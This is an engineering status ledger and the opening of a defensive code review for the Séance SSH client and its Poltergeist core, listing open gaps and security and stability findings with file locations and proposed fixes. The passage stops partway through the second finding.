| SOL-028 agent, jump hosts, forwards | PARTIAL | **Done (#131):** native agent client (`ssh/ssh_agent.dart`; Unix `$SSH_AUTH_SOCK`, Windows `\\.\pipe\openssh-ssh-agent`), ProxyJump execution over saved-host `jumpHostId` chains with per-hop TOFU/auth/keepalive/cleanup (`openAuthenticatedClient`, `ssh_session.dart:688+`). **Open:** no editor UI for `jumpHostId` (`server_editor.dart:919-920` "ProxyJump editing is not exposed yet"); no forwarding; no known_hosts import/export (`HostKey.fromPublicKey` exists, unused), randomart, key generation/deployment; Windows agent never exercised at runtime (`docs/STATUS.md:99-101`); strict-KEX audit of pinned dartssh2 3.0.2 (`packages/seance_core/pubspec.yaml:18`); Dependabot covers github-actions + gradle only, not pub (`.github/dependabot.yml`). | Add a "Connect via" saved-host picker in the editor (cycle-checked); then known_hosts import; then local forwarding. Add `pub` ecosystem to Dependabot. |
| SOL-024 honest reachability probes | OPEN | `packages/seance_core/lib/src/probe/probe_service.dart:31-56`: no `SSH-` check, any completed connect is online, every `SocketException` is offline. Done since: sweep serialization (`4a50782`). New gap: servers routed through `jumpHostId` are still probed directly (`updateServers` `:182-187` ignores the route). | Read up to 255 bytes for an `SSH-` line; map ECONNREFUSED to offline, DNS/unreachable/timeouts to unknown; skip (unknown) servers with a `jumpHostId`. |
| AST-009 / SOL-027 runaway parser, backend conformance | PARTIAL | #49 landed: 64 KiB cap then abandon (`third_party/xterm/lib/src/core/escape/parser.dart:14, 55-77`). Below the cap every write still rolls back and re-parses the pending run (`:70-72`), so cost is quadratic up to 64 KiB; the abandoned payload resumes as text and control bytes inside it are interpreted (`:73-75`); no fuzz/property tests; app still reaches past the seam (`ui/app_menus.dart:100` `engine.terminal.paste`, `terminal_pane.dart:1097`). | Make OSC/DCS parsing resumable (keep parser state across writes instead of rollback); decide and test the recovery policy for abandoned payloads; add chunk-boundary property tests. |
| AST-015 bound completed control-sequence work | OPEN | `third_party/xterm/lib/src/terminal.dart:502-510` loops `count` times. `6f3d7f3` only normalized zero counts to one. | Clamp REP to the remaining cells in the scroll region (or bulk-fill), and bound IL/DL/ICH/DCH/ECH/SU/SD by screen size; add 12-byte adversarial tests with a time bound. |
| AST-010 / SEA-006 bounded Unicode-safe pending-input hints | OPEN | `services/xterm_engine.dart:278-303` unchanged (`substring(0, length - 1)` on backspace, `+=` per rune, no bound); `app_state.dart:1893-1897` `_snippetTitle` and `:1825-1828` `_shortError` use `substring`. | Cap `_pendingInput` (e.g. 4 KiB, then mark unknown), delete by grapheme (`characters`), invalidate on arrows/history keys; reuse the middle-ellipsis grapheme truncation. |
| SEA-023/025/028; SOL-047 search and shell interaction | PARTIAL (navigation slice only) | **Search:** OPEN; only theme slots (`ui/terminal_appearance.dart:58-60, 132-134`). **Navigation:** done: focus server filter with ⌥⌘F / Ctrl+Alt+F (`ui/app_menus.dart:184-219`, `terminal_pane.dart:1150-1170`, #123), new tab ⌘T / Ctrl+Shift+T, Settings ⌘,; open: tab 1-9 / cycle, close-tab shortcut, clear terminal, shortcut help. SEA-009: guard still lives in the UI handler (`terminal_pane.dart:114-164`) while `AppState.closeTab` deletes local copies unguarded (`app_state.dart:2118-2151`). SEA-008: `_SessionView.dispose` never reports focus=false to the native menu (`terminal_pane.dart:1050-1058`). **Command slice:** OPEN; paste is unguarded (`app_menus.dart:96-102`). **Mobile gate:** OPEN. | Move the close guard into a `closeTab(..., confirm:)` service contract first; then add tab shortcuts; then scrollback find in the fork (bounded incremental scan, anchors). |
| SEA-026 disconnect recovery ("Last words") | OPEN | Disconnected sessions render `_Disconnected` instead of scrollback (`terminal_pane.dart:1080-1081`). | Render the retained `TerminalView` read-only with a reason/duration banner and Copy/Save/Reconnect. |

#### Performance

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-026/057/059; SEA-012; AST-012 latency harness | OPEN | Every tab stays mounted (`terminal_pane.dart:287` `IndexedStack`); only `test/connect_perf_test.dart` exists. Small partial: the MaterialApp now rebuilds only on `AppState.appearance` (#128, `bootstrap_test.dart`). | Build a captured-output replay benchmark (parser throughput, frame times) before any renderer/queue change. |
| SOL-058 / AST-006 residual network cancellation and bounds | OPEN | Providers use `Future.timeout` wrappers and never close (`llm/anthropic_provider.dart:101, 111, 138`; `openai_provider.dart:101, 113, 143`; `search.dart:34`); Z.AI (#75) is a fifth such client (STATUS 22). `ui/command_generator.dart:84-107` injects the reply after the await with no mounted/generation check, so a dismissed dialog can still type into the session. | Add owned-client `close()` to all five providers and close replaced instances in `AppServices`; guard command generator with a generation token + `mounted` before `injectInput`. |

#### Assistant privacy and usability

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-038/041; SEA-017 session-local, bounded, cancellable chat | PARTIAL | **Done (#91):** terminal context attached only within its turn (`packages/seance_core/lib/src/llm/chat_controller.dart:156-166`); reset/dispose generation invalidation (`services/chat_session.dart:51-60, 85-102`); paste target bound per send. **Open:** one global `ChatSession` (`app_state.dart:477`); no history budget; non-streaming `chat()` + `SelectableText` (`ui/chat_sidebar.dart:260`); no Markdown/Stop/Retry. | Key `ChatSession` by session id; add a byte budget with deterministic truncation; switch to `streamChat` with Stop. |
| SOL-042/044/045 native tools, outbound receipts | OPEN | Tool results appended as a user string (`chat_controller.dart:240`); `ChatResult.sent` is never rendered (no use in `app/`); Brave read from `settings.braveApiKeyRef` (`services/app_services.dart:902-911`) with no settings UI (settings has SearXNG and Z.AI only). | Typed tool calls/results preserving provider ids; render `sent` as an expandable receipt; add Brave to settings or remove it. |
| SOL-046 / AST-007 residual; SEA-034 shell-aware capture | OPEN | `onCommand` fires on every Enter regardless of OSC 133 phase (`services/xterm_engine.dart:315`; `atPrompt` gates only `activeCommand`, `:316`); no whisper mode or clear-history control; count bound exists (`services/command_stats.dart:38`, 400) but command length is unbounded. | Record commands only when `atPrompt` (OSC 133 B seen); add "Clear command history" and a whisper toggle; cap command length. |

#### Server operations and release reliability

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-049/050; SOL-002/007 residual quotas, snapshots, abuse | PARTIAL (small) | **Done (#90/#92):** configured limits validated (`seance_sync_server/lib/src/config.dart:66-93`); blob cap advertised (`sync/dtos.dart:115-140`). **Open:** no quotas; full snapshot per pull (`server.dart:177-189`); limiter unchanged (`rate_limiter.dart`); non-string prelogin username throws a cast error, i.e. 500 (`server.dart:120-122`). | Return 400 for non-string username (quick win); add per-account record/byte quota; design paged pull against a fixed watermark. |
| SOL-051/054 account transactions, schema, backups | OPEN | `createAccount` is two statements without a transaction (`sqlite_storage.dart:88-101`); `deleteAccount` four (`:104-109`); `_migrate` is `CREATE IF NOT EXISTS` only, no `user_version`, FKs or checks (`:33-70`). | Wrap register/delete in `_transaction(write)`; add `PRAGMA user_version` migrations; document WAL-safe backup. |
| SOL-052/053/055 readiness, drain, observability | OPEN | Only `/healthz` (`server.dart:36`); SIGTERM calls `close(force: true)` then `exit(0)` with no drain or DB close (`bin/seance_sync_server.dart:62-69`). | Add `/readyz` (SELECT 1 within a deadline); graceful drain then `storage.close()`; request-log middleware (id/route/status/duration). |
| SOL-040/056 release/update hardening | PARTIAL (small) | **Done:** Dependabot for github-actions and gradle (`15d0fdd`, `.github/dependabot.yml`), action bumps #109-#113. **Open:** `type=raw,value=latest` on every tag including prereleases (`.github/workflows/release.yml:315`); actions pinned by tag not SHA (only `zai-code-review` pinned); no tag-vs-pubspec check in the release gate (`release.yml:45-70`); no checksums or multi-arch; iOS `Info.plist` has no ATS/local-network keys; `AndroidManifest.xml` has no backup rules; stale claims remain: `packages/seance_sync_server/README.md:95` ("every request carries a protocolVersion"; GET `/v1/sync`, prelogin and DELETE do not), `PROPOSAL.md:86, 190` (scratch image vs `Dockerfile` `debian:stable-slim`). | Gate `latest` on non-prerelease; add a tag == pubspec version step; emit SHA256SUMS; fix the README claim. |

#### Adaptive layout, aesthetics and convenience

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-039/060/062/065; SEA-015/018 three-stage layout and navigation | PARTIAL | **Done:** #47 window geometry persisted and clamped to live displays (`services/window_state.dart:117-150`), mixed-DPI Windows; pane widths persisted (`ui/adaptive_shell.dart:48-58`); 1280x800 default on all desktops (`macos/Runner/MainFlutterWindow.swift:45`, `linux/runner/my_application.cc:14`, `windows/runner/main.cpp:32`); Android back from the narrow terminal returns to the list, drawer-first, predictive back opted in (`adaptive_shell.dart:74-110`, #123); Files back climbs folders; iOS edge swipe on Files (`63ef0ac`); scrollable host-key and k-i dialogs (#65, #83); desktop Settings window (#126). **Open:** still two-stage at the computed 960 px breakpoint (`adaptive_shell.dart:27-31`); narrow mode is a state flag, not routes (no iOS swipe-back from terminal); utility drawer fixed at 380 (`terminal_pane.dart:78`); utility tab and active host not persisted; no pane collapse or keyboard resizing; on Android 12L and older, back on the list still finishes the activity (`docs/STATUS.md:547-549`). | Add the medium stage (list + terminal + utility drawer); persist utility tab/active server; clamp drawer width to 90% of screen. |
| SOL-061/064; SEA-019/020/021/039 accessible controls, terminal prefs | PARTIAL | **Done:** one-value status dot, solid vs ring shape, spoken description (`ui/server_status_dot.dart:12-17, 38-61`, `f8675e1`); state text leads the second line (`c6d886b`); hidden-live header announcement (`0c8c95b`); row verbs via Shift+F10/Menu (`f35d7ee`); High-contrast preset + contrast tests (#128, `theme_presets_test.dart`); installed-font picker (#89). **Open:** tab close 28 px (`terminal_pane.dart:670-679`), key-bar minWidth 40 (`ui/terminal_keyboard_bar.dart:187`), compact mobile rows now 40 dp (#129), all below 44-48 dp; no keyboard-adjustable separators; no reduced-motion handling anywhere in `lib/` (no `disableAnimations` use); settings-recovery notice is a 10 s toast (`main.dart:193-206`); no cursor shape/blink, scrollback length (fixed `maxLines` 10000), bell, ligature, OSC 52 or remote-title settings. | Touch-only 44 dp minimums for tab close/key bar; persistent banner for settings recovery; honour `MediaQuery.disableAnimationsOf`; add cursor + scrollback settings. |
| SOL-063 visual hierarchy and identity | PARTIAL | **Done:** sidebar redesign (#123-#125), glyph colour vocabulary (#127), themes (#128), marks/colours/colour line (#89, #101, #102, #104, #106), Linux/Windows titles "Séance" (#123). **Open:** `screenshot.png` stale; no full-app golden matrix (320/700/960/1440, 1x/2x); no AppStream metainfo (`scripts/package-linux.sh:441`); small-size icon; theme known limits (`docs/STATUS.md:220-227`). | Recapture light/dark desktop+phone screenshots from the capture harness; add AppStream metainfo. |

#### Fast daily workflows

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| P1 Planchette palette | OPEN | No action palette; only ⌘K command generator. | Build a fuzzy palette over service commands (hosts, snippets, settings, sync). |
| P1 Quick connect | PARTIAL (favourites only) | Pinned shortlist (#96; `services/app_settings.dart:182-199`), Duplicate (#73), Test connection (#74). No one-off quick connect, recents or duplicate detection. | Add an unsaved one-off session reusing editor validation/TOFU; add MRU list. |
| P1 Device/account management | OPEN | No logout/unlink/delete-account UI (`HttpSyncClient.deleteAccount` at `packages/seance_core/lib/src/sync/http_sync_client.dart:148` is unused); server has no revoke/list (SOL-048). | After SOL-048: add "Sign out of sync" and "Delete account" in Settings. |
| P2 Safe context enrichment | OPEN | Signals exist (OSC 7 cwd, OSC 133 D exit code, OSC 1337 shell kind: `services/xterm_engine.dart:166-260`; `docs/SHELL_INTEGRATION.md`) but chat sends only `recentText(maxLines: 200)` (`ui/chat_sidebar.dart:70`). | Add cwd/shell/last exit status (or "unknown") as a labelled context header. |

#### Files and mobile persistence follow-up

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| Files widget tests with picker/opener fakes | OPEN | No `files_pane` widget test; only `test/remote_files_controller_test.dart`. | Add `files_pane_test.dart` with fake picker/opener. |
| Keyboard/accessibility pass | OPEN | `docs/SFTP.md:196` unchecked. | Arrow/Enter/Delete navigation in the file list. |
| Copy/move, drop onto folder rows, persisted sort/filter | OPEN | `docs/SFTP.md:185-194` unchecked. | Persist sort/filter per server in settings (smallest slice). |
| Real-device validation (OpenSSH, BBEdit/macOS, Android SAF, iOS) | OPEN | STATUS item 12. | Manual validation checklist. |
| Resumable/queued transfers, dedicated transfer connection, server-side hash, promised-file drag-out | OPEN | `docs/SFTP.md:181-184`. `openAuthenticatedClient` (PR-S2) makes a dedicated connection feasible. | Separate proposals. |
| Expose retained plaintext edits/storage/discard | PARTIAL | Per-file "Discard local copy" pre-existed (`ui/files_pane.dart:667, 1767`); closing a session counts local copies (`terminal_pane.dart:131-161`); editor keeps 0600 and refuses symlinks (#123). No storage overview. | Add a "Local copies" list with sizes and bulk discard. |
| Centralize destructive-close guards | OPEN | See SEA-009 row; more urgent now that editor tabs (`25f6e43`) and the git sidebar (#105) exist. | As SEA-009. |
| Android keep-alive device validation | OPEN | Only failure reporting refined (`b386180`, #126). | Device test: battery, OEM killers, Android 15 `dataSync` timeout. |
| Floating keyboards; iOS opener upload-back | OPEN | STATUS items 10 and 12. | Device validation. |

#### Optional product ideas table

| Idea | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| Fingerprint sigils / SEA-033 host hues | OPEN | Only user-chosen colours/marks (#89, #101); no randomart or fingerprint-derived hue. | Randomart in the TOFU dialog first. |
| Safe Draft Dock / SOL-047 | OPEN | Assistant/generator inject directly (`injectInput`). | As written. |
| Planchette | OPEN | See workflows. | As written. |
| Production wards | OPEN | Groups/colours/marks exist; no environment tag or extra confirmation. | Add a synced `environment` field. |
| OSC 133 command cards / SEA-028 | OPEN | OSC 133 only drives phase/activeCommand, tab names, Files/Git refresh. | Needs block model in the engine. |
| Last words | OPEN | `terminal_pane.dart:1080-1081`. | As SEA-026. |
| Completion notices / SEA-031 | OPEN | None. | Needs OSC 133 D per session. |
| Ghost tabs / SEA-032 | OPEN | None. | After the close-guard refactor. |
| Whisper mode / SEA-034 | OPEN | None. | See SOL-046. |
| Séance transcript / SEA-035 | OPEN | Only connection-log copy (`ui/connection_log_view.dart`). | As written. |
| Presence pulse / SEA-036 | OPEN | Core keepalive controls (#77) but no RTT UI. | Expose keepalive RTT from core first. |
| Custom/two-hand mobile decks / SEA-037 | OPEN | Fixed key row (`terminal_keyboard_bar.dart`). | As written. |
| Context ledger / SOL-044 | OPEN | See SOL-042 row. | As written. |
| Idle divination / SEA-038 | OPEN | Exec-channel seam now exists (`SshSession.runCommand`, used by Git #105). | Opt-in per host over `runCommand`. |
| Reading anchor / AST-011 | OPEN | None. | As written. |
| Connection flight recorder / AST-012 | OPEN | `SshConnectionLog` transcript only, no phase timings. | Add phase timestamps to the log. |
| Portable workspace recipe / AST-013 | OPEN | Geometry persists; sessions never auto-restore (`docs/STATUS.md:1085`). | As written. |
| Quiet connection rehearsal / AST-014 | PARTIAL | Test connection (#74; `packages/seance_core/lib/src/ssh/test_connection.dart`, ephemeral `UnpinnedHostKeyStore`, exercises ProxyJump). Missing: staged DNS/port/key-readability steps, real cancellation, validating only connection fields (STATUS 20). | Validate only host/user fields before testing; add staged checks. |
| Later proposals (splits, tmux/Mosh, provider-native search, OIDC, libghostty) | OPEN / deferred | STATUS "Deliberately deferred". | Keep. Update "#44/#45/#47/#49" sentence: #47 and #49 merged; #44/#45 absent from main. |

#### Completion ledger and earlier-work notes

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| Ledger rows #64-#71 | DONE (accurate) | Residuals re-audited above; AST-002 residual now partly done (#131). | Add ledger rows for #72-#131 and `6f3d7f3`. |
| "#63 ... OSC 8 hyperlinks remain separate enhancements" | STALE | OSC 8 implemented by #103 (`0f92961`, 2026-09-14). Keyboard link discovery and mobile gestures still open. | Move OSC 8 to done. |
| "SEA-030 documentation drift" | PARTIAL | AGENTS.md §8 branch text updated; counts inconsistent (AGENTS 700 Flutter vs STATUS 830); STATUS items 3 and 5 are stale; code comments cite wrong STATUS numbers (`server_editor.dart:60, 109` say 17, `app_services.dart:635` says 16; actual items 18/19 and 17). | Fix counts, delete STATUS 3/5, renumber or fix the cross-references. |
| "Redaction toggle and split UTF-8 are fixed" | DONE (confirmed) | `ui/chat_sidebar.dart:48`, `ui/command_generator.dart:74`; chunked `Utf8Decoder` `services/xterm_engine.dart:146-148`. | None (but STATUS still lists them). |
| SOL-036 macOS key-file access | DONE | Unchanged; bookmarks + audit log hardened (#80/#81). | Native validation only. |

#### Invariants and release gates

| Gate | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| Restart-level two-device typed deletion + forced ack/apply races | PARTIAL | Server/snippet deletion convergence tests (`packages/seance_core/test/sync_coordinator_test.dart:2200-2371`; `app/seance_app/test/deletion_tombstone_test.dart`). Ack/apply races untested (masked by queue); hostKey/secret deletes refused. | Add race tests once a persistent ledger exists. |
| Authenticated-envelope tamper/replay/transplant + migration fixtures | OPEN | SOL-011. | |
| Real HTTP-over-SQLite concurrent snapshot/upsert and crash tests | PARTIAL | #71 concurrency tests; no cross-process kill/crash tests. | |
| Independent crypto vectors, device KDF profiling, external review | OPEN | SOL-014 row. | |
| Real sshd auth/changed-key/resize/output/strict-KEX matrix | PARTIAL | `ssh_agent_unix_test.dart` (real Unix socket), blocked-row core path checked once against a local sshd (`docs/STATUS.md:450-451`); no sshd matrix in CI. | |
| Signed Apple keystore relaunch + Android upgrade/backup | OPEN | SOL-031, no backup rules. | |
| Adaptive golden/semantics + native keyboard/clipboard/IME | PARTIAL | Server-list captures, `narrow_back_navigation_test.dart`, Xvfb drives for #123/#126; no devices. | |
| Running-container readiness/persistence/backup/restart/SIGTERM smoke | OPEN | CI builds the image only; no `/readyz`. | |

### New gaps from post-consolidation work (not in ANALYSIS.md)

- **ProxyJump has no UI and is not imported:** `server_editor.dart:919-920`; ssh_config `ProxyJump` parsed but dropped (`ssh_config_import.dart:87` vs `:27-40`); probes ignore the route (`probe_service.dart:182-187`).
- **Assistant sync trust boundary (#76):** an opted-in peer can silently repoint provider/endpoint; "surfacing an adopted change of provider or endpoint is a follow-up"; rotated keys leave stale keystore entries (removals never travel); "stop sharing the keys" needs a sealed tombstone (`docs/STATUS.md:1085`, assistant-sync paragraph).
- **Exclude-from-sync residuals (#72):** no "has ever synced" bit, so re-linking can retract unprompted (`server_editor.dart:24-30`); a peer's later exclusion deletes a config this device re-included (`sync_coordinator.dart:555-563`); pins pushed before exclusion are withheld, never retracted (`sync_coordinator.dart:203-220`).
- **Sync round holds the mutation queue across network I/O** (STATUS 14; `app_state.dart:1528-1545`).
- **Settings window known limits (#126):** ⌘T/⌘K act on the app window while Settings is key; Settings window size/position not remembered; closing discards unsaved field input including API keys (`docs/STATUS.md:312-317`); macOS/Windows runners compiled but never run (`:309-310`).
- **Themes known limits (#128):** editor syntax colours and badge fills follow brightness not palette; bootstrap spinner in default theme; kit corner change Séance-only; tab never driven in a built app; Poltergeist port pending (`docs/STATUS.md:220-233`).
- **Touch target regression risk:** #129 made compact mobile rows 40 dp.
- **Android 12L and older:** back on the server list still ends sessions (`docs/STATUS.md:547-549`).
- **Unused `ServerAvatar`** awaiting a keep/remove decision (`docs/STATUS.md:523-525`).
- **Opt-in pinned-servers sync record** noted as the follow-up if wanted (`docs/STATUS.md:842-846`).
- **Poltergeist:** PR-S4 (agent + ProxyJump) is now delivered by #131 (`docs/POLTERGEIST.md` table still lists it as an ask); #56 remains the pin-trust gate for shared accounts.

### Open items in STATUS.md / astra.md not captured in ANALYSIS.md

From `docs/STATUS.md` "Open items":

| STATUS item | Captured? | Note |
|---|---|---|
| 2 Run the app for real end-to-end (`:1379-1382`) | Partly (native-validation remarks) | Keep as an explicit validation task. |
| 3 Honor the redaction toggle (`:1383-1385`) | n/a | **STALE:** implemented (`chat_sidebar.dart:48`, `command_generator.dart:74`). Delete from STATUS. |
| 4 Re-key carries unreadable entries forever (`:1388-1395`) | **No** | Needs a UI to show and discard orphaned/unreadable vault entries. |
| 5 UTF-8 across packets (`:1396-1398`) | n/a | **STALE:** chunked decoder (`xterm_engine.dart:146-148`). Delete from STATUS. |
| 11 macOS native Edit-menu path unverified (`:1436-1438`) | Partly (SEA-008 gate) | Keep as macOS validation. |
| 14 Split sync fetch from apply (`:1454-1465`) | **No** | Add under the ledger entry. |
| 15 Domain exception type for search failures (`:1467-1474`) | **No** | Low priority; do when a retry exists. |
| 16 Seal tombstones (`:1476-1482`) | Partly (SOL-011) | Record the concrete residuals: a hostile server can delete configs/snippets on every device; peers keep orphaned vault entries and unretracted pins. |
| 17 No way to clear a referenced key's passphrase (`:1483-1506`) | Partly (SOL-029 wording) | List explicitly; dartssh2 3.0.2 errors vs silent PKCS#1 behaviour documented there. |
| 19 One passphrase slot serves two keys (`:1518-1528`) | **No** (only generic SOL-029) | List explicitly. |
| 20 Test connection validates the whole form (`:1530-1541`) | **No** | Label validator blocks a pre-save test. |
| 21 Re-pasted key with blank passphrase loses it (`:1543-1564`) | **No** (only generic SOL-029) | List explicitly; STATUS argues 17/18/19/21 are one editor redesign. |
| 6-10, 12, 13, 18, 22 | Yes | SEA-028/SOL-038, provider-native search, PTY 80x24, SOL-046, keyboard reflow, SFTP, keep-alive, SOL-029, SOL-058. |
| Housekeeping: #54 text (`:1599-1602`) | n/a | **STALE:** servers and snippets now write tombstones (#84); the "every pull is full" half is still true. #56 still open. |
| "Should do next" numbering starts at 2 | n/a | Cosmetic drift. |

From `astra.md`: every finding (AST-001 to AST-015 and the SOL/SEA groups it cites) is represented in ANALYSIS.md; nothing would be lost. Two astra statements are now outdated: "Window sizing belongs to PR #47" (#47 merged) and "#49 ... Rebase/review it" (#49 merged; AST-009 residual above). "Local shell is already PR #44" is unverifiable from main (no code landed).

---

## P1 review: Poltergeist `poltergeist_core` (connection, engine, fs, checkout, preview, import, editor, sync/bookmarks)

Reviewer slice: `packages/poltergeist_core/lib/src/{connection,engine,fs,checkout,browse,preview,import,editor,update,sync,bookmarks}` (not `transfer/`, except where a transfer call site is the only consumer of a helper in this slice). Read-only review of the checkout at `/home/user/Poltergeist`. Reproductions ran against a scratch copy of the workspace (`scratchpad/work-P1/ws`, Dart 3.13.2 from `/opt/flutter`); nothing in the repository was modified.

### 1. Summary

The core is unusually well defended for its age. The pool/TOFU/incident logic has been through many audit rounds, and the local-FS commit dance, the checkout-store lifecycle and the credit-flow isolate bridge are careful and heavily tested. The biggest risks are at the seams between those parts, not inside them:

- **The engine isolate is a single point of failure, and nothing restarts it.** It is spawned with `errorsAreFatal: true` and no guarded zone. The pinned dartssh2 SFTP client parses packets in a stream listener that has no `onError`. One malformed or non-UTF-8 SFTP status packet from any server therefore kills every connection and every *local* pane. The app never observes `EngineClient.terminated`, so it stays dead until the app restarts (P1-01, reproduced).
- **Server configs are frozen per serverId for the whole session.** After a user edits a bookmark or server (host, user, port, key), the engine keeps dialing the old endpoint with the old credential reference until an explicit Disconnect or an app restart (P1-02, reproduced).
- **Remote files are OS-launched under their original names with no executable-extension guard.** The plan's "never executed" invariant (06 §5.3) is not implemented; the blocklist constant has no production consumer. On Windows, double-clicking a remote `.js`, `.hta`, `.vbs` or `.exe` runs it (P1-03).
- Several P2 issues:
  - TOFU pins are keyed by the raw host spelling, while pools and incidents use the normalized spelling. A changed key can therefore appear as a benign "first use" prompt (P1-04, reproduced).
  - Downloads apply the remote file's full 12-bit mode, including setuid and world-write (P1-05).
  - Any local destination under a symlink or junction is refused (P1-06, reproduced).
  - `copy_file_range` runs synchronous 16 MiB syscalls on the Flutter UI isolate (P1-07).
  - A save's post-commit write silently reverts a concurrent rename migration (P1-08, reproduced).
  - Windows file-name rules apply on Linux and macOS, so names like `db-2026-09-26T03:00:00.sql.gz` cannot be downloaded (P1-09).

### 2. Findings

| ID | Title | Sev | Category | NEW/KNOWN | Confidence |
|---|---|---|---|---|---|
| P1-01 | Malformed SFTP packet kills the engine isolate; app never notices or respawns | P1 | stability/data-safety | NEW | VERIFIED (decode crash and isolate death reproduced; end-to-end path traced) |
| P1-02 | Edited server config ignored for the session (stale `_ServerReference.config`) | P1 | bug | NEW | VERIFIED (reproduced with `PoolHarness`) |
| P1-03 | Remote Open launches checkouts under their original extension; the executable blocklist is dead code | P1 (P0 on Windows for `.js`/`.hta`/`.vbs`) | security | NEW | VERIFIED (code trace; not run on Windows) |
| P1-04 | TOFU pin lookup is host-spelling sensitive while pools and incidents normalize | P2 | security | NEW | VERIFIED (reproduced) |
| P1-05 | Downloads apply remote mode verbatim (setuid/setgid/sticky, o+w, bypasses umask), one `chmod` process per file | P2 | security / performance | NEW | VERIFIED (code) + measured 6.7 ms per spawn |
| P1-06 | `ensureSafeLocalDirectory` is called on unresolved user roots, so any destination under a symlink or junction fails | P2 | bug / cross-platform | NEW | VERIFIED (reproduced) |
| P1-07 | `copy_file_range` pump makes blocking 16 MiB syscalls on the UI isolate | P2 | performance / stability | NEW | VERIFIED (code path); jank size LIKELY |
| P1-08 | Checkout record lost update: save refresh and snapshot repair revert a concurrent `migrateRename` | P2 | stability/data-safety | NEW | VERIFIED (reproduced) |
| P1-09 | Windows name rules enforced on POSIX destinations (`:`, `?`, `aux.c`, trailing dot) | P2 | UX / cross-platform | NEW (plan-sanctioned wording in 03 §2.3, conflicts with 09 §3.5) | VERIFIED |
| P1-10 | Host-key and keyboard-interactive prompts are never withdrawn when their connect dies | P3 | UX | NEW | LIKELY |
| P1-11 | Local `listDirectory` stats serially (about 60 µs per entry) | P3 | performance | NEW | VERIFIED (measured) |
| P1-12 | Preview-cache index `file` field can point outside the cache dir | P3 | security (defense in depth) | NEW | VERIFIED (code) |
| P1-13 | ssh_config `%h`/`%d`/`%u` tokens in HostName/IdentityFile import literally, with no badge | P3 | missing-feature | NEW | VERIFIED (code) |
| P1-14 | Bookmark, server and record-store JSON written at umask default | P3 | security (privacy) | NEW | VERIFIED |
| P1-15 | Windows opener passes paths to `explorer.exe`, which splits on commas | P3 | cross-platform | NEW | SPECULATIVE |
| P1-16 | Small correctness nits: `QueuePreviewProducer` comment/code mismatch; `LocalFileSystem.createDirectory`/`rename` skip leaf validation; chmod via `PATH` in `_runUtility` | P3 | bug / polish | NEW | VERIFIED |
| P1-K | Still-open known items rechecked: `EngineHost._channels` and per-serverId maps grow without bound; cancellable listings absent | — | — | KNOWN (STATUS open item 3 "audit finding C", item 12) | VERIFIED still present |

---

#### P1-01: Malformed SFTP packet kills the engine isolate; app never notices or respawns
- **Severity:** P1. **Category:** stability/data-safety. **NEW.** **Confidence:** VERIFIED for the parts listed under Evidence; end-to-end path traced.
- **Locations:**
  - `packages/poltergeist_core/lib/src/engine/engine_client.dart:122-127`: `Isolate.spawn(... errorsAreFatal: true)`.
  - `packages/poltergeist_core/lib/src/engine/engine_host.dart:37-50`: `engineMain` has no `runZonedGuarded` and no error listener.
  - Pinned `dartssh2-3.0.2/lib/src/sftp/sftp_client.dart:42`: `_channel.stream.listen(_handleData);` with no `onError`. Packet decoders at `sftp_client.dart:476-541` throw on truncated input. `sftp_packet.dart:811`: `SftpStatusPacket.decode` uses strict `reader.readUtf8()`.
  - App: `app/poltergeist_app/lib/services/engine_session.dart:41` (`AppEngine` exposes no termination signal) and `:186-187`. Grepping `app/poltergeist_app/lib` finds no consumer of `.terminated`.
- **Evidence:** Reproduced in the scratchpad (`work-P1/sftpcrash`):
  - `SftpStatusPacket.decode` on a status message containing a Latin-1 byte throws `FormatException: Invalid UTF-8 byte`.
  - The same decode inside a stream `listen` without `onError`, in an isolate spawned with `errorsAreFatal: true`, ends in `isolate EXITED`.
  - Neither dartssh2 nor the engine uses a zone (`grep runZoned` finds nothing).
- **Failure scenario:** A buggy or hostile SFTP server answers with a truncated `SSH_FXP_NAME`, a zero-length packet, or a status message in a non-UTF-8 code page (some Windows SFTP servers localize these). An uncaught error lands in the engine root zone, and the isolate dies. `EngineClient._terminate` fails every pending call with "The engine is not running", then closes every stream.
  - Every remote connection and in-flight transfer is lost.
  - Every *local* pane is lost too, because local browsing is engine-side (`OpenLocalBrowseChannelRequest`).
  - The app keeps its UI but every action fails until restart. No banner appears and nothing respawns.
- **Fix (shovel-ready):**
  1. Core: in `engineMain`, run the listener setup inside `runZonedGuarded`. Route uncaught errors to a new `EngineFaultEvent(summary)` (protocol v14, message only, never the cause) and keep serving. Optionally spawn with `errorsAreFatal: false` plus `Isolate.current.addErrorListener`. A stuck SFTP reply waiter then degrades through the adapter's existing 30 s operation timeout into `disconnected` and normal recovery, instead of total engine loss.
  2. Core: expose `EngineClient.terminated` through a small `EngineSupervisor`. It respawns with the last `EngineConfig`, reseeded from the app's pin and incident stores, and publishes `Stream<EngineGeneration>`.
  3. App: add `AppEngine.terminated`/`generations`, show a "Connections were reset" banner, and rebind panes, which already know how to rebind after `disconnected`.
  4. Upstream (Séance/dartssh2): add `onError` to `SftpClient`'s channel listener and `allowMalformed: true` for status message and language strings.
- **Regression tests first:**
  - `engine_client_test.dart`: `spawnForTesting` with an entrypoint that wraps `engineMain` and schedules `scheduleMicrotask(() => throw StateError('boom'))` after boot. Assert that a later `openLocalChannel` still succeeds and one fault event arrives. This fails today because the isolate exits.
  - App-side: a fake `AppEngine` whose `terminated` completes, asserting respawn plus banner.
- **Effort:** M (core zone guard: S; supervisor and app respawn: M).

#### P1-02: Edited server config ignored for the session (stale reference)
- **Severity:** P1. **Category:** bug, with a security flavor. **NEW.** **Confidence:** VERIFIED (reproduced).
- **Locations:**
  - `connection/connection_manager.dart:1946-1948`: `_referenceFor` returns the existing reference, so `_resolveServer` never runs again.
  - `connection_manager.dart:1980-1981`: the comment says "Configs are cached per serverId for the session; bookmark edits invalidate them (M5's store owns that)". That invalidation was never built.
  - `connection_manager.dart:559`: `_references.remove` happens only in `disconnectServer`.
  - `engine/engine_host.dart:267` and `:325-329`: the host overwrites `_servers[serverId]` with every request's config, but the manager never re-reads it while a reference exists.
